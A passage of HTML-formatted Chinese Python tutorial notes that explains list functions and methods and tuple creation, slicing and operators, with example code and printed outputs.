href=\"#函数-1\" class=\"headerlink\" title=\"函数\"></a>函数</h3><table>\n<thead>\n<tr>\n<th align=\"left\">序号</th>\n<th align=\"left\">函数</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">1</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-att-list-len.html\">len(list)</a> 列表元素个数</td>\n</tr>\n<tr>\n<td align=\"left\">2</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-att-list-max.html\">max(list)</a> 返回列表元素最大值</td>\n</tr>\n<tr>\n<td align=\"left\">3</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-att-list-min.html\">min(list)</a> 返回列表元素最小值</td>\n</tr>\n<tr>\n<td align=\"left\">4</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-att-list-list.html\">list(seq)</a> 将元组转换为列表</td>\n</tr>\n</tbody></table>\n<table>\n<thead>\n<tr>\n<th align=\"left\">序号</th>\n<th align=\"left\">方法</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">1</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-att-list-append.html\">list.append(obj)</a> 在列表末尾添加新的对象</td>\n</tr>\n<tr>\n<td align=\"left\">2</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-att-list-count.html\">list.count(obj)</a> 统计某个元素在列表中出现的次数</td>\n</tr>\n<tr>\n<td align=\"left\">3</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-att-list-extend.html\">list.extend(seq)</a> 在列表末尾一次性追加另一个序列中的多个值（用新列表扩展原来的列表）</td>\n</tr>\n<tr>\n<td align=\"left\">4</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-att-list-index.html\">list.index(obj)</a> 从列表中找出某个值第一个匹配项的索引位置</td>\n</tr>\n<tr>\n<td align=\"left\">5</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-att-list-insert.html\">list.insert(index, obj)</a> 将对象插入列表</td>\n</tr>\n<tr>\n<td align=\"left\">6</td>\n<td align=\"left\">[list.pop(<a href=\"https://www.runoob.com/python3/python3-att-list-pop.html\">index=-1])</a> 移除列表中的一个元素（默认最后一个元素），并且返回该元素的值</td>\n</tr>\n<tr>\n<td align=\"left\">7</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-att-list-remove.html\">list.remove(obj)</a> 移除列表中某个值的第一个匹配项</td>\n</tr>\n<tr>\n<td align=\"left\">8</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-att-list-reverse.html\">list.reverse()</a> 反向列表中元素</td>\n</tr>\n<tr>\n<td align=\"left\">9</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-att-list-sort.html\">list.sort( key=None, reverse=False)</a> 对原列表进行排序</td>\n</tr>\n<tr>\n<td align=\"left\">10</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-att-list-clear.html\">list.clear()</a> 清空列表</td>\n</tr>\n<tr>\n<td align=\"left\">11</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-att-list-copy.html\">list.copy()</a> 复制列表</td>\n</tr>\n</tbody></table>\n<h3 id=\"函数示例-2\"><a href=\"#函数示例-2\" class=\"headerlink\" title=\"函数示例\"></a>函数示例</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">list1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'Google'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Runoob'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Taobao'</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>list1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 3</span>\nlist2 <span class=\"token operator\">=</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 创建一个 0-4 的列表</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>list2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 5</span>\n\nlist1<span class=\"token punctuation\">,</span> list2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'Google'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Runoob'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Taobao'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token number\">456</span><span class=\"token punctuation\">,</span> <span class=\"token number\">700</span><span class=\"token punctuation\">,</span> <span class=\"token number\">200</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"list1 最大元素值 : \"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">max</span><span class=\"token punctuation\">(</span>list1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># list1 最大元素值 :  Taobao</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"list2 最大元素值 : \"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">max</span><span class=\"token punctuation\">(</span>list2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># list2 最大元素值 :  700</span>\n\nlist1<span class=\"token punctuation\">,</span> list2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'Google'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Runoob'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Taobao'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token number\">456</span><span class=\"token punctuation\">,</span> <span class=\"token number\">700</span><span class=\"token punctuation\">,</span> <span class=\"token number\">200</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"list1 最小元素值 : \"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">min</span><span class=\"token punctuation\">(</span>list1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># list1 最小元素值 :  Google</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"list2 最小元素值 : \"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">min</span><span class=\"token punctuation\">(</span>list2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># list2 最小元素值 :  200</span>\n\naTuple <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">123</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Google'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Runoob'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Taobao'</span><span class=\"token punctuation\">)</span>\nlist1 <span class=\"token operator\">=</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span>aTuple<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"列表元素 : \"</span><span class=\"token punctuation\">,</span> list1<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 列表元素 :  [123, 'Google', 'Runoob', 'Taobao']</span>\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"Hello World\"</span>\nlist2 <span class=\"token operator\">=</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"列表元素 : \"</span><span class=\"token punctuation\">,</span> list2<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 列表元素 :  ['H', 'e', 'l', 'l', 'o', ' ', 'W', 'o', 'r', 'l', 'd']</span>\n\nlist1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'Google'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Runoob'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Taobao'</span><span class=\"token punctuation\">]</span>\nlist1<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token string\">'Baidu'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"更新后的列表 : \"</span><span class=\"token punctuation\">,</span> list1<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 更新后的列表 :  ['Google', 'Runoob', 'Taobao', 'Baidu']</span>\n\naList <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">123</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Google'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Runoob'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Taobao'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">123</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"123 元素个数 : \"</span><span class=\"token punctuation\">,</span> aList<span class=\"token punctuation\">.</span>count<span class=\"token punctuation\">(</span><span class=\"token number\">123</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 123 元素个数 :  2</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Runoob 元素个数 : \"</span><span class=\"token punctuation\">,</span> aList<span class=\"token punctuation\">.</span>count<span class=\"token punctuation\">(</span><span class=\"token string\">'Runoob'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># Runoob 元素个数 :  1</span>\n\nlist1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'Google'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Runoob'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Taobao'</span><span class=\"token punctuation\">]</span>\nlist2 <span class=\"token operator\">=</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 创建 0-4 的列表</span>\nlist1<span class=\"token punctuation\">.</span>extend<span class=\"token punctuation\">(</span>list2<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 扩展列表</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"扩展后的列表：\"</span><span class=\"token punctuation\">,</span> list1<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 扩展后的列表： ['Google', 'Runoob', 'Taobao', 0, 1, 2, 3, 4]</span>\n\nlist1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'Google'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Runoob'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Taobao'</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Runoob 索引值为'</span><span class=\"token punctuation\">,</span> list1<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span><span class=\"token string\">'Runoob'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># Runoob 索引值为 1</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Taobao 索引值为'</span><span class=\"token punctuation\">,</span> list1<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span><span class=\"token string\">'Taobao'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># Taobao 索引值为 2</span>\n\nlist1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'Google'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Runoob'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Taobao'</span><span class=\"token punctuation\">]</span>\nlist1<span class=\"token punctuation\">.</span>insert<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Baidu'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'列表插入元素后为 : '</span><span class=\"token punctuation\">,</span> list1<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 列表插入元素后为 :  ['Google', 'Baidu', 'Runoob', 'Taobao']</span>\n\nlist1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'Google'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Runoob'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Taobao'</span><span class=\"token punctuation\">]</span>\nlist1<span class=\"token punctuation\">.</span>pop<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"列表现在为 : \"</span><span class=\"token punctuation\">,</span> list1<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 列表现在为 :  ['Google', 'Runoob']</span>\nlist1<span class=\"token punctuation\">.</span>pop<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"列表现在为 : \"</span><span class=\"token punctuation\">,</span> list1<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 列表现在为 :  ['Google']</span>\n\nlist1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'Google'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Runoob'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Taobao'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Baidu'</span><span class=\"token punctuation\">]</span>\nlist1<span class=\"token punctuation\">.</span>remove<span class=\"token punctuation\">(</span><span class=\"token string\">'Taobao'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"列表现在为 : \"</span><span class=\"token punctuation\">,</span> list1<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 列表现在为 :  ['Google', 'Runoob', 'Baidu']</span>\nlist1<span class=\"token punctuation\">.</span>remove<span class=\"token punctuation\">(</span><span class=\"token string\">'Baidu'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"列表现在为 : \"</span><span class=\"token punctuation\">,</span> list1<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 列表现在为 :  ['Google', 'Runoob']</span>\n\nlist1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'Google'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Runoob'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Taobao'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Baidu'</span><span class=\"token punctuation\">]</span>\nlist1<span class=\"token punctuation\">.</span>reverse<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"列表反转后: \"</span><span class=\"token punctuation\">,</span> list1<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 列表反转后:  ['Baidu', 'Taobao', 'Runoob', 'Google']</span>\n\naList <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'Google'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Runoob'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Taobao'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Facebook'</span><span class=\"token punctuation\">]</span>\naList<span class=\"token punctuation\">.</span>sort<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"List : \"</span><span class=\"token punctuation\">,</span> aList<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># List :  ['Facebook', 'Google', 'Runoob', 'Taobao']</span>\n\nlist1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'Google'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Runoob'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Taobao'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Baidu'</span><span class=\"token punctuation\">]</span>\nlist1<span class=\"token punctuation\">.</span>clear<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"列表清空后 : \"</span><span class=\"token punctuation\">,</span> list1<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 列表清空后 :  []</span>\n\nlist1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'Google'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Runoob'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Taobao'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Baidu'</span><span class=\"token punctuation\">]</span>\nlist2 <span class=\"token operator\">=</span> list1<span class=\"token punctuation\">.</span>copy<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"list2 列表: \"</span><span class=\"token punctuation\">,</span> list2<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># list2 列表:  ['Google', 'Runoob', 'Taobao', 'Baidu']</span>\n\n<span class=\"token triple-quoted-string string\">'''\n3\n5\nlist1 最大元素值 :  Taobao\nlist2 最大元素值 :  700\nlist1 最小元素值 :  Google\nlist2 最小元素值 :  200\n列表元素 :  [123, 'Google', 'Runoob', 'Taobao']\n列表元素 :  ['H', 'e', 'l', 'l', 'o', ' ', 'W', 'o', 'r', 'l', 'd']\n更新后的列表 :  ['Google', 'Runoob', 'Taobao', 'Baidu']\n123 元素个数 :  2\nRunoob 元素个数 :  1\n扩展后的列表： ['Google', 'Runoob', 'Taobao', 0, 1, 2, 3, 4]\nRunoob 索引值为 1\nTaobao 索引值为 2\n列表插入元素后为 :  ['Google', 'Baidu', 'Runoob', 'Taobao']\n列表现在为 :  ['Google', 'Runoob']\n列表现在为 :  ['Google']\n列表现在为 :  ['Google', 'Runoob', 'Baidu']\n列表现在为 :  ['Google', 'Runoob']\n列表反转后:  ['Baidu', 'Taobao', 'Runoob', 'Google']\nList :  ['Facebook', 'Google', 'Runoob', 'Taobao']\n列表清空后 :  []\nlist2 列表:  ['Google', 'Runoob', 'Taobao', 'Baidu']\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"元组\"><a href=\"#元组\" class=\"headerlink\" title=\"元组\"></a>元组</h2><ol>\n<li>元组元素不能更改</li>\n<li>元组写在小括号内，以<code>,</code>分隔</li>\n<li>各元素类型可以不同</li>\n<li>元组的索引切片操作与string一样</li>\n</ol>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token builtin\">tuple</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1.2</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'test'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'dou'</span><span class=\"token punctuation\">)</span>\ntuple2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'test2'</span><span class=\"token punctuation\">)</span>\ntuple3 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 单个元素后面加逗号</span>\ntuple4 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 空元组</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>tuple4<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># ()</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">tuple</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># (1, 1.2, 'test', 'dou')</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>tuple3<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># (1,)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">tuple</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出第一个元素</span>\n<span class=\"token comment\"># 1</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">tuple</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出第二个到第三个元素</span>\n<span class=\"token comment\"># (1.2, 'test')</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">tuple</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出所有元素</span>\n<span class=\"token comment\"># (1, 1.2, 'test', 'dou')</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">tuple</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出所有元素</span>\n<span class=\"token comment\"># (1, 1.2, 'test', 'dou')</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">tuple</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出第三个及前面的所有</span>\n<span class=\"token comment\"># (1, 1.2, 'test')</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">tuple</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># (1, 1.2, 'test', 'dou', 1, 1.2, 'test', 'dou')</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">tuple</span> <span class=\"token operator\">+</span> tuple2<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># (1, 1.2, 'test', 'dou', 1, 'test2')</span>\n<span class=\"token triple-quoted-string string\">'''\n()\n(1, 1.2, 'test', 'dou')\n(1,)\n1\n(1.2, 'test')\n(1, 1.2, 'test', 'dou')\n(1, 1.2, 'test', 'dou')\n(1, 1.2, 'test')\n(1, 1.2, 'test', 'dou', 1, 1.2, 'test', 'dou')\n(1, 1.2, 'test', 'dou', 1, 'test2')\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"运算符-2\"><a href=\"#运算符-2\" class=\"headerlink\" title=\"运算符\"></a>运算符</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">tuple6 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'test'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>tuple6<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>tuple6<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 列表长度</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 组合</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'test'</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 重复</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span> <span class=\"token keyword\">in</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 存在与否</span>\n<span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> end<span class=\"token operator\">=</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 迭代</span>\n\n<span class=\"token triple-quoted-string string\">'''\n(1, 2, 3, 'test')\n4\n(1, 2, 3, 4, 5, 6)\n('test', 'test', 'test', 'test')\nTrue\n1 2 3 \n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"函数-2\"><a href=\"#函数-2\" class=\"headerlink\" title=\"函数\"></a>函数</h3><table>\n<thead>\n<tr>\n<th align=\"left\">序号</th>\n<th align=\"left\">方法及描述</th>\n<th align=\"left\">实例</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">1</td>\n<td align=\"left\">len(tuple) 计算元组元素个数。</td>\n<td align=\"left\"><code>&gt;&gt;&gt; tuple1 = ('Google', 'Runoob', 'Taobao') </code><br><code>&gt;&gt;&gt; len(tuple1) 3 </code></td>\n</tr>\n<tr>\n<td align=\"left\">2</td>\n<td align=\"left\">max(tuple) 返回元组中元素最大值。</td>\n<td align=\"left\"><code>&gt;&gt;&gt; tuple2 = ('5', '4', '8') </code><br><code>&gt;&gt;&gt; max(tuple2) '8'</code></td>\n</tr>\n<tr>\n<td align=\"left\">3</td>\n<td align=\"left\">min(tuple) 返回元组中元素最小值。</td>\n<td align=\"left\"><code>&gt;&gt;&gt; tuple2 = ('5', '4', '8') </code><br><code>&gt;&gt;&gt; min(tuple2) '4' </code></td>\n</tr>\n<tr>\n<td align=\"left\">4</td>\n<td align=\"left\">tuple(iterable) 将可迭代系列转换为元组。</td>\n<td align=\"left\"><code>&gt;&gt;&gt; list1= ['Google', 'Taobao', 'Runoob', 'Baidu'] </code><br><code>&gt;&gt;&gt; tuple1=tuple(list1) </code><br><code>&gt;&gt;&gt; tuple1 ('Google', 